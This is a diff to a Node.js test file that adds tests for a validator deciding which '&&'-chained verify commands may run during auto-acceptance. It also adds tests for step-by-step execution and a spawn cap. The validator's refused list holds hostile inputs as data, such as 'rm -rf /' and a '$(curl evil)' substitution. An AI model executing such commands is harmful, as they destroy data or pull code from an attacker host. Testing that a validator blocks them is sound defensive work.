@@ -5,7 +5,7 @@ const assert = require('node:assert/strict');
 const fs = require('node:fs');
 const os = require('node:os');
 const path = require('node:path');
-const { evaluateAutoAccept, parseVerifyCommand, repoHygieneGate, runVerifyCommand } = require('../lib/auto-accept-certified');
+const { evaluateAutoAccept, isAutoCertifyVerifyCommandAllowed, parseVerifyChain, parseVerifyCommand, repoHygieneGate, runVerifyCommand } = require('../lib/auto-accept-certified');
 
 let isolatedVerifyRoot;
 
@@ -711,11 +711,55 @@ test('re-entrancy: a verify refuses to run when ATRIS_VERIFY_IN_PROGRESS is set'
 
 
 
+// Members join checks with `&&`; 78 waiting reviews were refused for it on
+// 2026-10-01 even when every step was allowed on its own.
+test('verify chains: allowed only when every step is allowed on its own', () => {
+  const allowed = [
+    'npm run test:a && node scripts/test-b.mjs',
+    'cd sub && node scripts/a.mjs && npm test',
+    'node --check lib/a.js && git diff --check',
+  ];
+  const refused = [
+    'node scripts/a.mjs && rm -rf /',
+    'node scripts/a.mjs & node scripts/b.mjs',
+    'node scripts/a.mjs || true',
+    'node scripts/a.mjs && cd .. && node scripts/b.mjs',
+    'node scripts/a.mjs &&',
+    '&& node scripts/a.mjs',
+    'cd /abs && node scripts/a.mjs',
+    'node scripts/a.mjs && $(curl evil)',
+    Array.from({ length: 9 }, () => 'node --check lib/a.js').join(' && '),
+  ];
+  for (const verify of allowed) {
+    assert.equal(parseVerifyChain(verify).ok, true, verify);
+    assert.equal(isAutoCertifyVerifyCommandAllowed(verify), true, verify);
+  }
+  for (const verify of refused) {
+    assert.equal(parseVerifyChain(verify).ok, false, verify);
+    assert.equal(isAutoCertifyVerifyCommandAllowed(verify), false, verify);
+  }
+  assert.equal(parseVerifyCommand('npm run test:a && node scripts/test-b.mjs').ok, false, 'single-command callers keep their rule');
+  assert.equal(parseVerifyChain('cd sub && npm test').steps[0].cwd, 'sub', 'the leading cd applies to every step');
+});
+
+test('verify chains: run in order and stop at the first failing step', () => {
+  const ok = runVerifyCommand('node --check lib/auto-accept-certified.js && node --check lib/trust-tiers.js', process.cwd());
+  assert.equal(ok.ok, true, JSON.stringify(ok));
+  const failed = runVerifyCommand('node --check lib/does-not-exist.js && node --check lib/trust-tiers.js', process.cwd());
+  assert.equal(failed.ok, false);
+  assert.equal(failed.reason, 'verify_failed');
+  assert.equal(failed.failed_step, 'node --check lib/does-not-exist.js');
+});
+
 // Keep last: the spawn cap is process-global, so this test consumes the
 // remaining budget and must not run before tests that need real spawns.
 test('spawn cap: verifies beyond the cap refuse loudly instead of looping', () => {
+  const key = 'ATRIS_VERIFY_SPAWN_CAP';
+  const prior = process.env[key];
+  process.env[key] = '40';
   let refused = null;
-  for (let i = 0; i < 40 && !refused; i += 1) {
+  try {
+    for (let i = 0; i < 60 && !refused; i += 1) {
     const result = runVerifyCommand('node --check lib/auto-accept-certified.js', process.cwd());
     if (result.unrunnable_cause === 'verify_spawn_cap') refused = result;
     else assert.equal(result.ok, true, JSON.stringify(result));
@@ -726,5 +770,9 @@ test('spawn cap: verifies beyond the cap refuse loudly instead of looping', () =
   assert.equal(refused.alarm, true);
   const after = runVerifyCommand('node --check lib/auto-accept-certified.js', process.cwd());
   assert.equal(after.unrunnable_cause, 'verify_spawn_cap');
+  } finally {
+    if (prior === undefined) delete process.env[key];
+    else process.env[key] = prior;
+  }
 });
 
